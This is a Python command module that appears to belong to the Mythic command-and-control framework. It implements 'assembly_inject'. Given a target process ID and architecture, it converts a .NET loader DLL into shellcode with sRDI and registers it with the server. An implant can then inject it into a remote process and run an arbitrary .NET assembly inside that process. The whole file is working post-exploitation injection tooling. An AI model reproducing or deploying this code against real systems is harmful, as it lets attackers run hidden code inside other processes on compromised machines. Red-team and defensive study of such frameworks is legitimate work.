from CommandBase import *
import json
from uuid import uuid4
from os import path
from sRDI import ShellcodeRDI
from MythicFileRPC import *


class AssemblyInjectArguments(TaskArguments):

    def __init__(self, command_line):
        super().__init__(command_line)
        self.args = {
            "pid": CommandParameter(name="PID", type=ParameterType.Number, description="Process ID to inject into."),
            "arch": CommandParameter(name="Process Architecture", type=ParameterType.String, choices=["x86", "x64"], description="Architecture of the remote process."),
            "assembly_name": CommandParameter(name="Assembly Name", type=ParameterType.String, description="Name of the assembly to execute."),
            "assembly_arguments": CommandParameter(name="Assembly Arguments", type=ParameterType.String, description="Arguments to pass to the assembly."),
        }

    invalidNumberArgs = Exception("Invalid number of arguments given.")

    async def parse_arguments(self):
        if self.command_line == 0:
            raise self.invalidNumberArgs
        parts = self.command_line.split(" ", maxsplit=3)
        if len(parts) < 3:
            raise self.invalidNumberArgs
        pid = parts[0]
        arch = parts[1]
        assembly_name = parts[2]
        assembly_args = ""
        valid_arch = ["x86", "x64"]
        if len(parts) == 4:
            assembly_args = parts[3]
        if arch not in valid_arch:
            arches = ", ".join(valid_arch)
            raise Exception(f"Invalid arch of \"{arch}\" specified. Must be one of {arches}")
        self.args["pid"].value = pid
        self.args["arch"].value = arch
        self.args["assembly_name"].value = assembly_name
        self.args["assembly_arguments"].value = assembly_args
        pass


class AssemblyInjectCommand(CommandBase):
    cmd = "assembly_inject"
    needs_admin = False
    help_cmd = "assembly_inject [pid] [x64|x86] [assembly] [args]"
    description = "Inject the unmanaged assembly loader into a remote process. The loader will then execute the .NET binary in the context of the injected process."
    version = 1
    is_exit = False
    is_file_browse = False
    is_process_list = False
    is_download_file = False
    is_upload_file = False
    is_remove_file = False
    author = "@djhohnstein"
    argument_class = AssemblyInjectArguments
    browser_script = BrowserScript(script_name="unmanaged_injection", author="@djhohnstein")
    attackmapping = []

    async def create_tasking(self, task: MythicTask) -> MythicTask:
        arch = task.args.get_arg("arch")
        pipe_name = str(uuid4())
        dllFile = path.join(self.agent_code_path, f"AssemblyLoader_{arch}.dll")
        dllBytes = open(dllFile, 'rb').read()
        converted_dll = ShellcodeRDI.ConvertToShellcode(dllBytes, ShellcodeRDI.HashFunctionName("InitializeNamedPipeServer"), pipe_name.encode(), 0)
        task.args.add_arg("pipe_name", pipe_name)
        resp = await MythicFileRPC(task).register_file(converted_dll)
        if resp.status == MythicStatus.Success:
            task.args.add_arg("loader_stub_id", resp.agent_file_id)
        else:
            raise Exception(f"Failed to host sRDI loader stub: {resp.error_message}")
        task.args.remove_arg("arch")
        return task

    async def process_response(self, response: AgentResponse):
        pass